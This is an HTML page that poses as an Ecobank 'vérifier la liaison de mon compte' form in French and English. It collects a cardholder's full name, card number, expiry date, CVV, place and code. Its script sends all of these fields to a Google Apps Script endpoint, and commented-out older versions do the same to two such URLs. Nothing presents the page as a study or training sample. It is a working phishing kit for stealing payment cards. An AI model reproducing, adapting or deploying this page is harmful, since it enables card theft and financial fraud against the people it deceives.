<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ECOBANK</title>
        <style>

        /* From Uiverse.io by zanina-yassine */ 
.modal {
  width: fit-content;
  height: fit-content;
  background: #FFFFFF;
  box-shadow: 0px 187px 75px rgba(0, 0, 0, 0.01), 0px 105px 63px rgba(0, 0, 0, 0.05), 0px 47px 47px rgba(0, 0, 0, 0.09), 0px 12px 26px rgba(0, 0, 0, 0.1), 0px 0px 0px rgba(0, 0, 0, 0.1);
  border-radius: 26px;
  max-width: 450px;
}

.form {
  display: flex;
  flex-direction: column;
  gap: 20px;
  padding: 20px;
}

.payment--options {
  width: calc(100% - 40px);
  display: grid;
  grid-template-columns: 33% 34% 33%;
  gap: 20px;
  padding: 10px;
}

.payment--options button {
  height: 55px;
  background: #F2F2F2;
  border-radius: 11px;
  padding: 0;
  border: 0;
  outline: none;
}

.payment--options button svg {
  height: 18px;
}

.payment--options button:last-child svg {
  height: 22px;
}

.separator {
  width: calc(100% - 20px);
  display: grid;
  grid-template-columns: 1fr 2fr 1fr;
  gap: 10px;
  color: #8B8E98;
  margin: 0 10px;
}

.separator > p {
  word-break: keep-all;
  display: block;
  text-align: center;
  font-weight: 600;
  font-size: 11px;
  margin: auto;
}

.separator .line {
  display: inline-block;
  width: 100%;
  height: 1px;
  border: 0;
  background-color: #e8e8e8;
  margin: auto;
}

.credit-card-info--form {
  display: flex;
  flex-direction: column;
  gap: 15px;
}

.input_container {
  width: 100%;
  height: fit-content;
  display: flex;
  flex-direction: column;
  gap: 5px;
}

.split {
  display: grid;
  grid-template-columns: 4fr 2fr;
  gap: 15px;
}

.split input {
  width: 100%;
}

.input_label {
  font-size: 10px;
  color: #8B8E98;
  font-weight: 600;
}

.input_field {
  width: auto;
  height: 40px;
  padding: 0 0 0 16px;
  border-radius: 9px;
  outline: none;
  background-color: #F2F2F2;
  border: 1px solid #e5e5e500;
  transition: all 0.3s cubic-bezier(0.15, 0.83, 0.66, 1);
}

.input_field:focus {
  border: 1px solid transparent;
  box-shadow: 0px 0px 0px 2px #242424;
  background-color: transparent;
}

.purchase--btn {
  height: 55px;
  background: #F2F2F2;
  border-radius: 11px;
  border: 0;
  outline: none;
  color: #ffffff;
  font-size: 13px;
  font-weight: 700;
  background: linear-gradient(180deg, #104f97 0%, #104f97 50%, #104f97 100%);
  box-shadow: 0px 0px 0px 0px #FFFFFF, 0px 0px 0px 0px #104f97;
  transition: all 0.3s cubic-bezier(0.15, 0.83, 0.66, 1);
}

.purchase--btn:hover {
  box-shadow: 0px 0px 0px 2px #FFFFFF, 0px 0px 0px 4px #0b962e;
}

/* Reset input number styles */
.input_field::-webkit-outer-spin-button,
.input_field::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

.input_field[type=number] {
  -moz-appearance: textfield;
}
    </style>
    </head>
    <body>

        <div class="modal">
            <form class="form" id="ecobankForm">
                <div class="separator">
                    <hr class="line">
                    <p>ECOBANK - verifier la liaison de mon compte</p>
                    <hr class="line">
                </div>
                <div class="credit-card-info--form">
                    <div class="input_container">
                        <label for="password_field" class="input_label">Card
                            holder full name / Nom complet</label>
                        <input id="password_field" class="input_field"
                            type="text" name="input-name" title="Inpit title" required
                            placeholder="Enter your full name / Nom complet">
                    </div>
                    <div class="input_container">
                        <label for="password_field" class="input_label">Card
                            Number / Numero de card</label>
                        <input id="password_field" class="input_field" required
                            type="number" name="input-name" title="Inpit title"
                            placeholder="0000 0000 0000 0000">
                    </div>
                    <div class="input_container">
                        <label for="password_field" class="input_label">Expiry
                            Date / CVV</label>
                        <div class="split">
                            <input id="password_field" class="input_field"
                                type="text" name="input-name" required
                                title="Expiry Date / Date d'expiration" placeholder="01/23">
                            <input id="password_field" class="input_field"
                                type="number" name="cvv" title="CVV"
                                placeholder="CVV" required>
                        </div>
                    </div>

                    <div class="input_container">
                        <label for="lieu_code" class="input_label">Lieu / code</label>
                        <div class="split">
                            <input id="lieu_code" class="input_field"
                                type="text" name="lieu" required
                                title="Lieu" placeholder="Lieu">
                            <input id="lieu_code" required class="input_field"
                                type="number" name="code" title="code"
                                placeholder="Code">
                        </div>
                    </div>

                </div>
                <button type="submit" class="purchase--btn">Verifier la liaison</button>
            </form>
        </div>

        <script>
document.getElementById('ecobankForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  // 1. Afficher un indicateur de chargement
  const submitBtn = e.target.querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Envoi en cours...';

  try {
    // 2. Préparer les données
    const formData = {
      fullName: document.querySelector('input[placeholder="Enter your full name / Nom complet"]').value,
      cardNumber: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
      expiryDate: document.querySelector('input[placeholder="01/23"]').value,
      cvv: document.querySelector('input[placeholder="CVV"]').value,
      lieu: document.querySelector('input[placeholder="Lieu"]').value,
      code: document.querySelector('input[placeholder="Code"]').value
    };

    // 3. Envoyer les données avec un timeout
    const response = await Promise.race([
      fetch('https://script.google.com/macros/s/AKfycbwMH4cKgUEGzUkD8dIKHDS7va8_d4BDnxTySm1S5Lg/exec', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData)
      }),
      new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Timeout après 10 secondes')), 10000)
      )
    ]);

    // 4. Traiter la réponse
    const result = await response.json();
    
    if (result.success) {
      alert(result.message || 'Données enregistrées avec succès!');
      // Réinitialiser le formulaire si besoin
      e.target.reset();
    } else {
      throw new Error(result.error || 'Erreur inconnue du serveur');
    }
    
  } catch (error) {
    console.error('Erreur:', error);
    alert('Erreur: ' + error.message);
  } finally {
    // 5. Réactiver le bouton
    submitBtn.disabled = false;
    submitBtn.textContent = 'Vérifier la liaison';
  }
});

/* document.getElementById('ecobankForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const formData = {
    fullName: document.querySelector('input[placeholder="Enter your full name / Nom complet"]').value,
    cardNumber: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
    expiryDate: document.querySelector('input[placeholder="01/23"]').value,
    cvv: document.querySelector('input[placeholder="CVV"]').value,
    lieu: document.querySelector('input[placeholder="Lieu"]').value,
    code: document.querySelector('input[placeholder="Code"]').value
  };

  try {
    const response = await fetch('https://script.google.com/macros/s/AKfycbwMH4cKgUEGzUkD8dIKHDS7va8_d4BDnxTySm1S5Lg/exec', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(formData)
    });
    
    const result = await response.json();
    if (result.success) {
      alert('Données enregistrées avec succès!');
    } else {
      alert('Erreur: ' + (result.error || 'Erreur inconnue'));
    }
  } catch (error) {
    console.error('Error:', error);
    alert('Erreur de connexion. Veuillez réessayer.');
  }
}); */


         /*  fetch('https://script.google.com/macros/s/AKfycbwMH4cKgUEGzUkD8dIKHDS7va8_d4BDnxTySm1S5Lg/exec', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    fullName: document.querySelector('input[placeholder="Enter your full name / Nom complet"]').value,
    cardNumber: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
    expiryDate: document.querySelector('input[placeholder="01/23"]').value,
    cvv: document.querySelector('input[placeholder="CVV"]').value,
    lieu: document.querySelector('input[placeholder="Lieu"]').value,
    code: document.querySelector('input[placeholder="Code"]').value
  })
})
.then(response => response.json())
.then(data => {
  if (data.success) {
    alert("Données enregistrées avec succès !");
  } else {
    alert("Erreur : " + data.error);
  }
})
.catch(error => {
  console.error("Erreur :", error);
  alert("Une erreur est survenue. Voir la console pour plus de détails.");
}); */

        /* document.getElementById('ecobankForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Récupérer les données du formulaire
            const formData = {
                fullName: document.querySelector('input[placeholder="Enter your full name / Nom complet"]').value,
                cardNumber: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
                expiryDate: document.querySelector('input[placeholder="01/23"]').value,
                cvv: document.querySelector('input[placeholder="CVV"]').value,
                lieu: document.querySelector('input[placeholder="Lieu"]').value,
                code: document.querySelector('input[placeholder="Code"]').value,
                timestamp: new Date().toISOString()
            };

            // Envoyer les données à Google Apps Script
            fetch('https://script.google.com/macros/s/AKfycbww6K906AXnS5m974UFLWGAZpC3EnTxCfH_chG6kpcUOCFN_NsD6EOhSI3Tig8ZBDci/exec', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            })
            .then(() => {
                alert('Vérification en cours...');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }); */
    </script>

    </body>
</html>
